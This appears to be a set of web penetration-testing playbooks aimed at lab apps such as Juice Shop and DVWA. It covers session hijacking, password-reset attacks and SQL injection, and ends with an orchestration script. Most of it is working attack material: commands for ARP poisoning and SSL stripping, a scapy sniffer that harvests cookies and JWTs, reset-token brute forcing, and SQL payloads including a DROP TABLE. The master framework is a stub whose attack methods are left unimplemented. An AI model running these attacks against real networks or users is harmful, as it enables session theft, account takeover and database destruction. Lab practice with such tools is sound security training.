# Playbook 07: Session Hijacking

## Objective

Capture and hijack user sessions to gain unauthorized access without knowing credentials.

## Target Applications

- OWASP Juice Shop (JWT tokens, session cookies)
- DVWA (PHP session management)
- XVWA (Various session mechanisms)
- WebGoat (Java session handling)

## Prerequisites

- Wireshark/tcpdump
- Burp Suite Professional
- Ettercap (for MitM)
- Python 3 with scapy
- Browser developer tools

## Attack Vectors

### 1. Network Sniffing

```bash
# Capture HTTP traffic
tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'

# Extract cookies from captured traffic
tcpdump -nn -A -s1500 -l | grep "Set-Cookie\|Cookie:"
```

### 2. Man-in-the-Middle Attacks

```bash
# ARP poisoning with ettercap
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# SSL stripping
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

## Automated Python Script

```python
#!/usr/bin/env python3
"""
Session Hijacking and Management Script
"""

import requests
import re
import json
import base64
from scapy.all import *
import threading

class SessionHijacker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.captured_sessions = []
        self.session = requests.Session()

    def packet_handler(self, packet):
        """Handle captured packets for session extraction"""
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')

            # Extract cookies
            cookie_match = re.search(r'Cookie: (.+)', payload)
            if cookie_match:
                cookies = cookie_match.group(1)
                print(f"[+] Captured cookies: {cookies}")
                self.captured_sessions.append(cookies)

            # Extract JWT tokens
            jwt_match = re.search(r'authorization: bearer ([^\\r\\n]+)', payload, re.IGNORECASE)
            if jwt_match:
                token = jwt_match.group(1)
                print(f"[+] Captured JWT: {token}")
                self.analyze_jwt(token)

    def analyze_jwt(self, token):
        """Analyze JWT token structure"""
        try:
            parts = token.split('.')
            if len(parts) == 3:
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

                print(f"JWT Header: {header}")
                print(f"JWT Payload: {payload}")

                return {'header': header, 'payload': payload, 'signature': parts[2]}
        except Exception as e:
            print(f"Error analyzing JWT: {e}")
        return None

    def session_fixation_attack(self):
        """Attempt session fixation"""
        # Generate a session ID
        response = self.session.get(self.target_url)
        original_cookies = self.session.cookies

        print(f"Original session cookies: {dict(original_cookies)}")

        # Try to fix the session
        if 'PHPSESSID' in original_cookies:
            fixed_session = 'HIJACKED_SESSION_123'
            self.session.cookies.set('PHPSESSID', fixed_session)

            print(f"Attempting session fixation with: {fixed_session}")
            response = self.session.get(self.target_url)

            if fixed_session in str(response.cookies):
                print("[+] Session fixation successful!")
                return True

        return False

    def start_sniffing(self, interface='eth0'):
        """Start packet sniffing for session capture"""
        print(f"Starting packet capture on {interface}")
        sniff(iface=interface, prn=self.packet_handler, filter="tcp port 80 or tcp port 443")

# Usage example for different applications
def juice_shop_session_attack(target_url):
    """Specific attack for Juice Shop"""
    hijacker = SessionHijacker(target_url)

    # Start sniffing in background
    sniff_thread = threading.Thread(target=hijacker.start_sniffing)
    sniff_thread.daemon = True
    sniff_thread.start()

    print("Sniffing for Juice Shop sessions...")
    time.sleep(60)  # Capture for 1 minute

if __name__ == "__main__":
    target = "http://localhost:3000"
    hijacker = SessionHijacker(target)
    hijacker.session_fixation_attack()
```

## Detection and Exploitation

### Session Token Analysis:

- Weak randomness patterns
- Predictable session IDs
- Missing secure flags
- Exposed tokens in URLs

### Mitigation:

- Use HTTPS everywhere
- Implement secure session management
- Regular session rotation
- HttpOnly and Secure flags

---

# Playbook 08: Password Reset Vulnerabilities

## Objective

Exploit password reset mechanisms to gain unauthorized access through flawed implementation.

## Attack Vectors

### 1. Password Reset Token Analysis

```python
#!/usr/bin/env python3
"""
Password Reset Vulnerability Scanner
"""

import requests
import re
import time
import hashlib

class PasswordResetTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def test_token_predictability(self, email):
        """Test if reset tokens are predictable"""
        tokens = []

        for i in range(5):
            # Request password reset
            reset_data = {'email': email}
            response = self.session.post(f"{self.target_url}/reset", data=reset_data)

            # Extract token from response/email (simulated)
            token_match = re.search(r'token=([a-zA-Z0-9]+)', response.text)
            if token_match:
                token = token_match.group(1)
                tokens.append(token)
                print(f"Token {i+1}: {token}")

            time.sleep(1)

        # Analyze patterns
        if len(set(tokens)) < len(tokens):
            print("[!] Duplicate tokens found - Poor randomness!")

        return tokens

    def test_token_brute_force(self, email):
        """Test token brute force possibilities"""
        # Generate potential tokens
        potential_tokens = []

        # Time-based tokens
        current_time = int(time.time())
        for offset in range(-300, 301):  # ±5 minutes
            potential_tokens.append(str(current_time + offset))
            potential_tokens.append(hashlib.md5(str(current_time + offset).encode()).hexdigest()[:8])

        # Sequential tokens
        for i in range(1000, 9999):
            potential_tokens.append(str(i))

        print(f"Testing {len(potential_tokens)} potential tokens...")

        for token in potential_tokens[:100]:  # Limit for demo
            reset_url = f"{self.target_url}/reset?token={token}&email={email}"
            response = self.session.get(reset_url)

            if "invalid token" not in response.text.lower():
                print(f"[+] Valid token found: {token}")
                return token

        return None

if __name__ == "__main__":
    tester = PasswordResetTester("http://localhost:3000")
    tester.test_token_predictability("admin@juice-sh.op")
```

---

# Playbook 11: SQL Injection

## Objective

Exploit SQL injection vulnerabilities to access and manipulate database data.

## Attack Vectors

### 1. Detection and Exploitation

```bash
# SQLMap automated testing
sqlmap -u "http://target/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --dbs

# Manual testing
curl "http://target/page?id=1'" # Test for errors
curl "http://target/page?id=1 AND 1=1" # Boolean-based
curl "http://target/page?id=1 UNION SELECT 1,2,3" # Union-based
```

### 2. Automated Python Script

```python
#!/usr/bin/env python3
"""
SQL Injection Testing Suite
"""

import requests
import re
import time

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.payloads = self.load_payloads()

    def load_payloads(self):
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]

    def test_parameter(self, param_name, original_value):
        """Test a parameter for SQL injection"""
        for payload in self.payloads:
            test_value = original_value + payload
            params = {param_name: test_value}

            response = self.session.get(self.target_url, params=params)

            # Check for SQL error indicators
            sql_errors = [
                "mysql_fetch_array",
                "ORA-01756",
                "Microsoft OLE DB Provider",
                "syntax error",
                "mysql_num_rows"
            ]

            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"[+] SQL Injection found with payload: {payload}")
                    return True

        return False

if __name__ == "__main__":
    tester = SQLInjectionTester("http://10.30.0.235/dvwa/vulnerabilities/sqli/")
    tester.test_parameter("id", "1")
```

---

# Complete Framework Script

Let me create a master script that orchestrates all attacks:

```python
#!/usr/bin/env python3
"""
Master Penetration Testing Framework
Orchestrates all 30 playbooks
"""

import subprocess
import json
import time
from pathlib import Path

class PentestFramework:
    def __init__(self, target_url, app_type="auto"):
        self.target_url = target_url
        self.app_type = app_type
        self.results = {}

    def run_all_playbooks(self):
        """Execute all 30 playbooks in sequence"""

        playbooks = [
            # Reconnaissance (1-5)
            ("Web App Fingerprinting", self.fingerprint_application),
            ("Directory Discovery", self.discover_directories),
            ("Technology Stack ID", self.identify_technology),
            ("DNS Enumeration", self.enumerate_dns),
            ("Social Engineering", self.gather_osint),

            # Authentication (6-10)
            ("Brute Force", self.brute_force_attack),
            ("Session Hijacking", self.session_hijacking),
            ("Password Reset", self.password_reset_attack),
            ("MFA Bypass", self.mfa_bypass),
            ("JWT Exploitation", self.jwt_exploitation),

            # Injection (11-15)
            ("SQL Injection", self.sql_injection),
            ("NoSQL Injection", self.nosql_injection),
            ("Command Injection", self.command_injection),
            ("LDAP Injection", self.ldap_injection),
            ("XPath Injection", self.xpath_injection),

            # XSS (16-20)
            ("Reflected XSS", self.reflected_xss),
            ("Stored XSS", self.stored_xss),
            ("DOM XSS", self.dom_xss),
            ("XSS Filter Bypass", self.xss_filter_bypass),
            ("XSS to RCE", self.xss_to_rce),

            # Business Logic (21-25)
            ("Business Logic Flaws", self.business_logic),
            ("Race Conditions", self.race_conditions),
            ("File Upload", self.file_upload),
            ("SSRF", self.ssrf_attack),
            ("IDOR", self.idor_attack),

            # Advanced (26-30)
            ("RCE", self.remote_code_execution),
            ("Privilege Escalation", self.privilege_escalation),
            ("Data Exfiltration", self.data_exfiltration),
            ("Persistence", self.establish_persistence),
            ("Lateral Movement", self.lateral_movement)
        ]

        for name, method in playbooks:
            print(f"\n[+] Executing Playbook: {name}")
            try:
                result = method()
                self.results[name] = result
            except Exception as e:
                print(f"[!] Error in {name}: {e}")
                self.results[name] = {"error": str(e)}

    def fingerprint_application(self):
        # Implementation from Playbook 01
        pass

    def discover_directories(self):
        # Implementation from Playbook 02
        pass

    # ... (other playbook methods)

    def generate_report(self):
        """Generate comprehensive penetration test report"""
        report = {
            "target": self.target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "results": self.results,
            "summary": self.generate_summary()
        }

        with open(f"pentest_report_{int(time.time())}.json", "w") as f:
            json.dump(report, f, indent=2)

        return report

if __name__ == "__main__":
    framework = PentestFramework("http://localhost:3000")
    framework.run_all_playbooks()
    framework.generate_report()
```
